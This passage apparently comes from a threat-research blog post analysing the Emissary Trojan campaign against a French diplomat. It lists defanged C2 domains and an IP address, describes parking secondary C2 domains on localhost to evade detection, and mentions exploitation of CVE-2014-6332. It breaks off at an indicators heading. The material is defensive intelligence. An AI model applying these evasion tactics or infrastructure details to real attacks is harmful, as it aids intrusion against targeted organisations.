<p>The infrastructure associated with the Emissary C2 servers used in this attack includes ustar5.PassAs[.]us, 203.124.14.229 and dnt5b.myfw[.]us. The infrastructure is rather isolated as the only overlap in domains includes appletree.onthenetas[.]com. The overlap, as seen in Figure 9 involves two IP addresses that during the same time frame resolved both the appletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us. The other C2 domain used by this Emissary payload, specifically dnt5b.myfw[.]us currently resolves to the 127.0.0.1. This provides another glimpse into TTPs for these threat actors, as it suggests that the threat actors set the secondary C2 domains to resolve to the localhost IP address to avoid network detection and change this to a routable IP address when they need the C2 server operational. Additionally, while this infrastructure does not overlap with that used in Operation Lotus Blossom, that also fits with the TTPs. In each case, the threat actors used separate infrastructure for different targets, another way to help avoid detection.</p>
<p><img decoding="async" class="aligncenter size-large wp-image-11547" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/fig9-500x679.png" alt="fig9" width="500" height="679" /></p>
<p style="text-align: center;"><em>Figure 9 Infrastructure associated with Emissary Trojan</em></p>
<h1>Conclusion</h1>
<p>APT threat actors, most likely nation state-sponsored, targeted a diplomat in the French Ministry of Foreign Affairs with a seemingly legitimate invitation to a technology conference in Taiwan. It is entirely possible the diplomat was truly invited to the conference, or at least would not have been surprised by the invitation, adding to the likelihood the attachment would have been opened. The actors were attempting to exploit CVE-2014-6332 to install a new version of the Emissary Trojan, specifically version 5.3.</p>
<p>The Emissary Trojan is related to the Elise malware used in <a href="https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/">Operation Lotus Blossom</a>, which was an attack campaign on targets in Southeast Asia, in many cases also with official looking decoy documents that do not appear to have been available online. Additionally, the targeting of a French diplomat based in Taipei, Taiwan aligns with previous targeting by these actors, as does the separate infrastructure. Based on the targeting and lures, Unit 42 assesses that the threat actors’ collection requirements not only include militaries and government agencies in Southeast Asia, but also nations involved in diplomatic and trade agreements with them.</p>
<h1>Indicators</h1>
<p><strong>Related Hashes<br />

                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>
